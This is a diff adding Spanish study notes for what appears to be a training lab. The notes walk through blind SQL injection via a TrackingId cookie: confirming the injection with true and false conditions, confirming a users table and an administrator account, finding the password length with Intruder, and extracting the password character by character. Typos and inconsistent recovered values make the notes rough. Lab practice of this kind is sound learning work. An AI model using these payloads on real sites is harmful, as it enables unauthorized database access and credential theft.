@@ -120,6 +120,65 @@ PASO 5 IDENTIFICAR LAS COLUMNAS
 
 SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users_xrkoxi'-- // OBTIENE LAS COLUMNAS DE LA TABLA
 
+##Reinici el laboratio
+1 Se debe confirmar la inyección de SQL Blind
+Con el verdadero y el falgo
+La consulta base imaginaria sera
+SELECT TRACKINGID FROM TACKINGTABLE WHERE TRACKINGID ='xyz'
+
+SELECT TRACKINGID FROM TACKINGTABLE WHERE TRACKINGID ='xyz' AND 1=1 --
+LA INYECCIÓN SERA: ' AND 1=1 --
+TEN ENCUENTA EL '  porque en el codigo se en el que se genero la aplciación lleva '' de tal manera que cuando lo ingresas de manera manual debes omitir el del final
+
+2 CONFIRMAR LA TABLA DE USUARIOS
+AND (SELECT 'x' from users limit 1)='x' -> se confirmo la tabla
+
+3 confimar usuario administrador
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator
+Se confirma el usuario administrador
+
+4 enumerar la contraseña
+
+TrackingId=xyz' AND (SELECT password FROM users WHERE username='administrator')='administrator
+TrackingId=xyz' AND (SELECT x FROM users WHERE username='administrator' and LENGTH(password )>1)='x
+
+Se busca a traves de intruder que se automatiza la consulta
+$ significa el valor que va a tomar intruder en el payload de numbero de 1 a 25, step 1
+TrackingId=xyz' AND (SELECT x FROM users WHERE username='administrator' and LENGTH(password )=$1$)='x
+
+el lenght que cambia el la respuesta correcta aunque tambien se puede filtrar la respuesta pero solo en la version PRO
+
+para enumerar los caracteres de la contraseña
+TrackingId=xyz' AND (SELECT substring (password,1,1) x FROM users WHERE username='administrator')='a'--
+
+TrackingId=xyz' AND (SELECT substring (password,1,1) x FROM users WHERE username='administrator')='a'--
+inicio en 0 la mia
+040pgaz1eejq1swbf6n
+0403pgaz1e8jq1swbf6n
+
+0
+1 0
+2 4
+3 0
+5 p
+6 g
+7 a
+8 z
+9 1
+10 e
+12 j
+13 q
+14 1
+15 s
+16 w
+17 b
+18 f
+19 6
+20 n
+
+
 
 ```
 
